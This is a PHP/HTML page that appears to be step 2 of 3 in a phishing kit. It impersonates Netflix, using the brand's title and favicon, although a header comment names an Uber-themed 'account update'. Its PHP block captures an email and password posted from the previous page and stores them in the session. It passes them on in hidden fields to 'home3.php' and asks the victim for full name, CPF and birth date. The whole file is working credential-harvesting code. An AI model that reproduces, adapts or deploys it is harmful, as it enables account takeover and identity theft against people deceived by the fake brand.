<!-- 
Theme Name: Uber Atualização cadastrais
Author: MK(rj)
 -->
  <?php
     session_start();

     $email = $_POST['email'];
     $senha = $_POST['senha'];

    $_SESSION["email"] = $email;
    $_SESSION["senha"] = $senha;
 ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>Netflix</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/jquery.mobile-1.3.2.min.js"></script>
    <script src="js/jquery.mask.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/script.js"></script>

        <!-- mascara -->
    <script type="text/javascript">
        $(document).ready(function(){
          $('#cpf').mask('000.000.000-00'); 
          $('#nascimento').mask('00/00/0000'); 
        });
    </script>

</head>
<body id="tela2">
    <header id="topo">
        <div class="container-fluid">
            <div class="row">
                <div class="col-xs-6">
                    <h1 class="logo">
                        <img src="img/logo.png">
                    </h1>
                </div>
                <div class="col-xs-6">
                    <!-- <span class="btn-entrar">Entrar</span> -->
                </div>
            </div>
        </div>
    </header>
    <section class="info-dados">
        <div class="container">
            <div class="passos-topo">
                <p>PASSOS <strong>2</strong> DE <strong>3</strong><br>
                <p>Faltam só dois passos!<br>
                Nós também detestamos formulários.</p>
                <span>Informe alguns dados.</span>
            </div>
            <form action="home3.php" method="POST" name="form1">
                <input type="hidden" name="email" id="email" value="<?php echo $_SESSION["email"] ?>">
                <input type="hidden" name="senha" id="senha" value="<?php echo $_SESSION["senha"] ?>">
                
                <div class="form-group">
                    <input id="nome" name="nome" placeholder="Nome Completo" type="text" minlength="10" required>
                </div>
                <div class="form-group">
                    <input id="cpf" name="cpf" placeholder="CPF" type="tel" minlength="11" required>
                </div>
                <div class="form-group">
                    <input id="nascimento" name="nascimento" placeholder="Data de nascimento (DD/MM/AAAA)" type="tel" minlength="8" required>
                </div>
                <div class="form-group">
                    <input type="submit" name="" value="Confirmar">
                </div>
            </form>
        </div>
    </section>
</body>
</html>